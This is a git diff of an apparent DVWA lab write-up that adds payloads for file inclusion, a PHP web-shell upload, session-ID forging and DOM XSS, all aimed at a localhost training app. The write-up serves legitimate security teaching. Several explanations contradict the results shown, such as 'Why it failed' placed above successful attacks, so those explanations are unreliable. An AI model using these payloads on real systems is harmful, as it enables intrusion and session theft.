@@ -217,46 +217,50 @@ File Inclusion vulnerabilities allow attackers to include arbitrary files — ei
 **Payload Used (LFI):**
 
 ```
-http://localhost:8080/vulnerabilities/fi/?page=../../../../etc/passwd
+http://localhost:8080/vulnerabilities/fi/?page=../../../../../../etc/passwd
 ```
 
-**Result:** Contents of `/etc/passwd` displayed in the browser.
+> ![Screenshot: File Inclusion – Low](screenshots/file-inclusion/file-inclusion-low.png)
 
-> 📸 **[Screenshot: File Inclusion – Low – /etc/passwd via LFI]**
+**Result:** Moved into the /etc directory and access the passwd file
 
 **Why it worked:**  
 The `page` parameter is passed directly to `include()` with no validation:
-
-```php
-include($_GET['page']);
-```
 
 ---
 
 ### Security Level: Medium
 
-**Payload Used:**
+**Payload:**
 
 ```
-http://localhost:8080/vulnerabilities/fi/?page=....//....//etc/passwd
+http://localhost:8080/vulnerabilities/fi/?page=..././..././..././..././..././..././etc/passwd
 ```
 
-_(Double slash encoding to bypass simple `../` removal)_
+> ![Screenshot: File Inclusion – Medium](screenshots/file-inclusion/file-inclusion-medium.png)
 
-**Result:** Medium-level filtering strips `../` but not `....//`, allowing traversal.
+**Result:** Moved into the /etc directory and access the passwd file
 
-> 📸 **[Screenshot: File Inclusion – Medium – encoding bypass]**
+
+**Why it worked:**  
+Medium-level filtering strips `../` but not `....//`, allowing traversal.
 
 ---
 
 ### Security Level: High
 
-**Result:** Only whitelisted filenames (`file1.php`, `file2.php`, `file3.php`, `include.php`) are accepted. All other values are rejected.
+**Payload:**
 
-> 📸 **[Screenshot: File Inclusion – High – whitelist enforced]**
+```
+http://localhost:8080/vulnerabilities/fi/?page=file:///etc/passwd
+```
+
+> ![Screenshot: File Inclusion – High](screenshots/file-inclusion/file-inclusion-high.png)
+
+**Result:** Allows us to read local files from the system rather than from the web server
 
 **Why it failed:**  
-A strict whitelist approach means only known-safe files can be included. No traversal or arbitrary path is possible.
+A strict whitelist approach means only known-safe files can be included.
 
 ---
 
@@ -323,14 +327,37 @@ Medium checks the `Content-Type` header sent by the client, which can be trivial
 
 **Payload Attempted:**
 
-Embedded PHP in a real JPEG using `exiftool`, renamed to `.jpg`.
+```javascript
+const gifHeader = 'GIF89a';
+const phpPayload = '<?php system($_GET["cmd"]); ?>';
+const maliciousContent = gifHeader + phpPayload;
+const blob = new Blob([maliciousContent], { type: "image/png" });
+const file = new File([blob], "shell.php.png", { type: "image/png" });
+const formData = new FormData();
+formData.append("uploaded", file);
+formData.append("Upload", "Upload");
+fetch("http://localhost:8080//vulnerabilities/upload/", {
+  method: "POST",
+  credentials: "include",
+  body: formData
+})
+.then(r => r.text())
+.then(html => {
+  const match = html.match(/(succes|error|invalid|Your image)[^<]*/i);
+  if (match) {
+    console.log("Result:", match[0]);
+  } else {
+    console.log(html.substring(1500, 2500));
+  }
+});
+```
 
-**Result:** File is stored, but it cannot be executed as PHP because the server only serves `.jpg` files as images.
+> ![Screenshot: File Upload – High](screenshots/file-upload/file-upload-high.png)
 
-> 📸 **[Screenshot: File Upload – High – file stored but not executable]**
+**Result:** succesfully uploaded
 
 **Why it failed:**  
-High level uses `getimagesize()` to verify actual image file structure, rejects files that fail the check, and enforces server-side extension whitelisting so `.php` files are not served as PHP.
+The server only checked two things: the file extension and the MIME type, but never validated that the actual file contents were a real PNG image — so the PHP payload embedded inside was accepted without question.
 
 ---
 
@@ -506,20 +533,58 @@ Weak Session IDs occur when session tokens are generated using predictable algor
 
 ### Security Level: Low
 
-> 📸 **[Screenshot: Weak Session IDs – Low]**
+**Payload Attempted:**
+```javascript
+document.cookie = "dvwaSession=5";
+```
+
+> ![Screenshot: Weak Session IDs – Low](screenshots/weak-session-ids/weak-sesion-id-low.png)
+
+**Result**
+We are able to manually change the session ID since it it an integer.
+
+**Why it worked**
+Session IDs are sequential integers starting at 1 since they are completely predictable
 
 ---
 
 ### Security Level: Medium
 
-> 📸 **[Screenshot: Weak Session IDs – Medium]**
+```javascript
+document.cookie = `dvwaSession=${ts}`;
+```
 
+> ![Screenshot: Weak Session IDs – Medium](screenshots/weak-session-ids/weak-sesion-id-medium.png)
+
+**Result**
+We are able to manually change the session ID since its based of off the unix timestamp.
+
+**Why it worked**
+The ID is just the current Unix time, which anyone can calculate or guess within seconds.
 ---
 
 ### Security Level: High
 
-> 📸 **[Screenshot: Weak Session IDs – High]**
+```javascript
+const knownMD5s = {
+  "c4ca4238a0b923820dcc509a6f75849b": "1",
+  "c81e728d9d4c2f636f067f89cc14862c": "2",
+  "eccbc87e4b5ce2fe28308fd9f2a7baf3": "3",
+  "a87ff679a2f3e71d9181a67b7542122c": "4",
+  "e4da3b7fbbce2345d7772b0674a318d5": "5"
+};
 
+const current = document.cookie.match(/dvwaSession=([^;]+)/);
+console.log("Current session:", current ? current[1] : "not found");
+console.log("Corresponds to count:", knownMD5s[current?.[1]] || "unknown");
+
+document.cookie = "dvwaSession=c4ca4238a0b923820dcc509a6f75849b";
+```
+
+> ![Screenshot: Weak Session IDs – Medium](screenshots/weak-session-ids/weak-sesion-id-high.png)
+
+**Why it worked**
+MD5 of a predictable integer is still predictable — MD5 is not a secure source of randomness.
 ---
 
 ## 10. DOM Based Cross Site Scripting (XSS)
@@ -532,20 +597,41 @@ DOM-based XSS occurs when client-side JavaScript processes user input and dynami
 
 ### Security Level: Low
 
-> 📸 **[Screenshot: DOM Based XSS – Low]**
+**Payload**
+```
+http://localhost:8080/dvwa/vulnerabilities/xss_d/?default=<script>alert(document.cookie)</script>
+```
 
+> ![Screenshot: DOM Based Cross Site Scripting (XSS) – Low](screenshots/xss-dom/xss-dom-low.png)
+
+**Why it worked**
+The default parameter is written directly into the page via document.write() or innerHTML with zero filtering.
 ---
 
 ### Security Level: Medium
 
-> 📸 **[Screenshot: DOM Based XSS – Medium]**
+**Payload**
+```
+http://localhost:8080/dvwa/vulnerabilities/xss_d/?default=English</option></select><img src=x onerror=alert(document.cookie)>
+```
 
+> ![Screenshot: DOM Based Cross Site Scripting (XSS) – Medium](screenshots/xss-dom/xss-dom-medium.png)
+
+**Why it worked**
+The filter only blacklists ```<script>``` — breaking out of the <select> element with </option></select> allows injecting arbitrary HTML tags with event handlers.
 ---
 
 ### Security Level: High
 
-> 📸 **[Screenshot: DOM Based XSS – High]**
+**Payload**
+```
+http://localhost:8080/vulnerabilities/xss_d/?default=Spanish#%3Cscript%3Ealert('I%20was%20here')%3C/script%3E
+```
 
+> ![Screenshot: DOM Based Cross Site Scripting (XSS) – High](screenshots/xss-dom/xss-dom-high.png)
+
+**Why it worked**
+High security whitelists certain values but the DOM manipulation still happens client-side
 ---
 
 ## 11. Cross-Site Scripting (XSS) – Reflected
